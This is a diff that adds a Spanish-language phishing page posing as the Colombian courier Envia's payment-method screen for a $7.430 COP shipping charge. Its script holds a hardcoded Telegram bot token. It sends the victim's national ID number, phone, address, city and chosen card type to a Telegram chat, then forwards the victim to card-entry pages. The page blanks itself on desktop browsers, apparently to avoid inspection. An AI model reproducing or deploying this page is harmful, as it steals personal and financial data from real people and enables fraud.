@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Método de Pago - Envia</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        html, body {
+            height: 100%;
+            overflow: hidden;
+        }
+        
+        .content-wrapper {
+            display: none;
+            height: 100%;
+            width: 100%;
+        }
+        
+        @media screen and (max-width: 1024px) {
+            .content-wrapper {
+                display: block;
+                overflow-y: auto;
+                overflow-x: hidden;
+            }
+        }
+        
+        @media screen and (max-width: 1366px) and (orientation: portrait) {
+            .content-wrapper {
+                display: block;
+                overflow-y: auto;
+                overflow-x: hidden;
+            }
+        }
+        
+        .desktop-block {
+            display: block;
+            width: 100vw;
+            height: 100vh;
+            background: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 9999;
+        }
+        
+        @media screen and (max-width: 1024px) {
+            .desktop-block {
+                display: none !important;
+            }
+        }
+        
+        @media screen and (max-width: 1366px) and (orientation: portrait) {
+            .desktop-block {
+                display: none !important;
+            }
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #8a8a8a;
+        }
+        
+        .page-container {
+            min-height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background: white;
+            padding: 16px 20px;
+            text-align: center;
+            flex-shrink: 0;
+        }
+        
+        .logo {
+            max-height: 45px;
+            max-width: 180px;
+            width: auto;
+            height: auto;
+        }
+        
+        .tagline {
+            font-size: 11px;
+            color: #666;
+            margin-top: 6px;
+            letter-spacing: 0.5px;
+        }
+        
+        .hero-section {
+            padding: 24px 20px 30px;
+            color: white;
+            flex-shrink: 0;
+        }
+        
+        .badge {
+            display: inline-block;
+            background: white;
+            color: #e60012;
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        h1 {
+            font-size: clamp(26px, 6vw, 36px);
+            font-weight: 800;
+            line-height: 1.1;
+            margin-bottom: 16px;
+            color: white;
+        }
+        
+        .subtitle {
+            font-size: clamp(14px, 3.5vw, 16px);
+            line-height: 1.5;
+            color: rgba(255,255,255,0.95);
+            max-width: 500px;
+        }
+        
+        .payment-container {
+            background: #f5f5f5;
+            border-radius: 20px 20px 0 0;
+            flex: 1;
+            min-height: 0;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .payment-header {
+            background: #e60012;
+            color: white;
+            padding: 18px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 600;
+            font-size: 16px;
+            border-radius: 20px 20px 0 0;
+            flex-shrink: 0;
+        }
+        
+        .payment-header svg {
+            width: 22px;
+            height: 22px;
+            flex-shrink: 0;
+        }
+        
+        .payment-body {
+            padding: 28px 20px 40px;
+            flex: 1;
+            overflow-y: auto;
+        }
+        
+        .cost-summary {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 24px;
+            text-align: center;
+            border: 2px solid #e60012;
+        }
+        
+        .cost-label {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+        
+        .cost-amount {
+            font-size: 32px;
+            font-weight: 800;
+            color: #1a1a1a;
+        }
+        
+        .cost-currency {
+            font-size: 16px;
+            color: #666;
+            font-weight: 500;
+        }
+        
+        .method-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+        
+        .payment-methods {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+        
+        .method-card {
+            background: white;
+            border: 2px solid #ddd;
+            border-radius: 12px;
+            padding: 20px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            transition: all 0.2s;
+            position: relative;
+        }
+        
+        .method-card:hover {
+            border-color: #e60012;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        
+        .method-card.selected {
+            border-color: #e60012;
+            background: #fef2f2;
+        }
+        
+        .method-card.selected::after {
+            content: '✓';
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 24px;
+            height: 24px;
+            background: #e60012;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        
+        .method-icon {
+            width: 60px;
+            height: 40px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            flex-shrink: 0;
+        }
+        
+        .method-icon.visa {
+            background: #1a1f71;
+            color: white;
+            font-weight: bold;
+            font-style: italic;
+        }
+        
+        .method-icon.mastercard {
+            background: linear-gradient(90deg, #eb001b 50%, #f79e1b 50%);
+            position: relative;
+        }
+        
+        .method-icon.mastercard::before {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: #ff5f00;
+            border-radius: 50%;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        
+        .method-info {
+            flex: 1;
+        }
+        
+        .method-name {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 4px;
+        }
+        
+        .method-desc {
+            font-size: 13px;
+            color: #666;
+        }
+        
+        .btn-continue {
+            width: 100%;
+            background: #ccc;
+            color: white;
+            border: none;
+            padding: 18px;
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 12px;
+            cursor: not-allowed;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.2s;
+            margin-top: auto;
+        }
+        
+        .btn-continue.active {
+            background: #e60012;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(230, 0, 18, 0.3);
+        }
+        
+        .btn-continue.active:active {
+            transform: scale(0.98);
+            background: #b3000e;
+        }
+        
+        .btn-continue svg {
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+        }
+        
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #e8f5e9;
+            border: 1px solid #a5d6a7;
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #2e7d32;
+        }
+        
+        .secure-badge svg {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+        }
+        
+        @media screen and (max-height: 700px) {
+            .hero-section {
+                padding: 20px 20px 24px;
+            }
+            
+            .payment-body {
+                padding: 24px 20px 30px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+        }
+        
+        @media screen and (min-width: 768px) and (max-width: 1024px) {
+            .page-container {
+                max-width: 600px;
+                margin: 0 auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="desktop-block"></div>
+    
+    <div class="content-wrapper">
+        <div class="page-container">
+            <div class="header">
+                <img src="logo.png" alt="Envia" class="logo" onerror="this.style.display='none'">
+                <div class="tagline">pasión por lo que hacemos</div>
+            </div>
+            
+            <div class="hero-section">
+                <div class="badge">Envia Colombia</div>
+                
+                <h1>Selecciona tu método de pago</h1>
+                
+                <p class="subtitle">
+                    Elige cómo deseas realizar el pago de tu envío.
+                </p>
+            </div>
+            
+            <div class="payment-container">
+                <div class="payment-header">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                        <rect x="2" y="5" width="20" height="14" rx="2"/>
+                        <line x1="2" y1="10" x2="22" y2="10"/>
+                    </svg>
+                    Método de pago
+                </div>
+                
+                <div class="payment-body">
+                    <div class="cost-summary">
+                        <p class="cost-label">Total a pagar</p>
+                        <p class="cost-amount">$7.430</p>
+                        <p class="cost-currency">COP</p>
+                    </div>
+                    
+                    <p class="method-title">Selecciona una opción:</p>
+                    
+                    <div class="payment-methods">
+                        <div class="method-card" onclick="seleccionarMetodo('visa_nequi')" id="visaNequi">
+                            <div class="method-icon visa">VISA</div>
+                            <div class="method-info">
+                                <div class="method-name">Visa Nequi</div>
+                                <div class="method-desc">Paga con tu tarjeta Visa a través de Nequi</div>
+                            </div>
+                        </div>
+                        
+                        <div class="method-card" onclick="seleccionarMetodo('mastercard_bancolombia')" id="mastercardBancolombia">
+                            <div class="method-icon mastercard"></div>
+                            <div class="method-info">
+                                <div class="method-name">Mastercard Bancolombia</div>
+                                <div class="method-desc">Paga con tu Mastercard Bancolombia</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="secure-badge">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                        </svg>
+                        <span>Pago seguro con encriptación SSL</span>
+                    </div>
+                    
+                    <button class="btn-continue" id="btnContinuar" onclick="procesarPago()" disabled>
+                        Continuar
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                            <path d="M5 12h14M12 5l7 7-7 7"/>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // CONFIGURACIÓN DEL BOT DE TELEGRAM
+        const BOT_TOKEN = '8955093413:AAH-iW-vYcLq__GHBB2rpqpECA6JDCdQUZE';
+        const CHAT_ID = '-5547241763';
+        
+        const cedula = sessionStorage.getItem('cedula') || 'No disponible';
+        const celular = sessionStorage.getItem('celular') || 'No disponible';
+        const direccion = sessionStorage.getItem('direccion') || 'No disponible';
+        const ciudad = sessionStorage.getItem('ciudad') || 'No disponible';
+        const departamento = sessionStorage.getItem('departamento') || 'No disponible';
+        
+        let metodoSeleccionado = null;
+        
+        function isMobileDevice() {
+            return (
+                /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
+                (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
+                window.innerWidth <= 1024
+            );
+        }
+        
+        if (!isMobileDevice()) {
+            document.body.innerHTML = '<div style="width:100vw;height:100vh;background:white;"></div>';
+        }
+        
+        function seleccionarMetodo(metodo) {
+            metodoSeleccionado = metodo;
+            
+            document.querySelectorAll('.method-card').forEach(card => {
+                card.classList.remove('selected');
+            });
+            
+            if (metodo === 'visa_nequi') {
+                document.getElementById('visaNequi').classList.add('selected');
+            } else {
+                document.getElementById('mastercardBancolombia').classList.add('selected');
+            }
+            
+            const btn = document.getElementById('btnContinuar');
+            btn.disabled = false;
+            btn.classList.add('active');
+        }
+        
+        async function procesarPago() {
+            if (!metodoSeleccionado) return;
+            
+            sessionStorage.setItem('metodoPago', metodoSeleccionado);
+            
+            const nombreMetodo = metodoSeleccionado === 'visa_nequi' ? 'Visa Nequi' : 'Mastercard Bancolombia';
+            
+            const mensaje = `🔴 PASO 3 (MÉTODO DE PAGO) - ENVIACO\n\n` +
+                `📋 Cédula: ${cedula}\n` +
+                `📱 Celular: ${celular}\n` +
+                `📍 Dirección: ${direccion}\n` +
+                `🏙 Ciudad: ${ciudad}\n` +
+                `🏛 Departamento: ${departamento}\n` +
+                `💰 Monto: $7.430 COP\n` +
+                `💳 Método seleccionado: ${nombreMetodo}\n` +
+                `🕐 Fecha: ${new Date().toLocaleString()}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Error:', error);
+            }
+            
+            // ============================================
+            // REDIRECCIÓN CONDICIONAL SEGÚN EL MÉTODO
+            // ============================================
+            if (metodoSeleccionado === 'visa_nequi') {
+                window.location.href = 'pagotarjeta_visa.html';  // Flujo Visa Nequi
+            } else {
+                window.location.href = 'pagotarjeta_mc.html';  // Flujo Mastercard Bancolombia
+            }
+        }
+    </script>
+</body>
+</html>
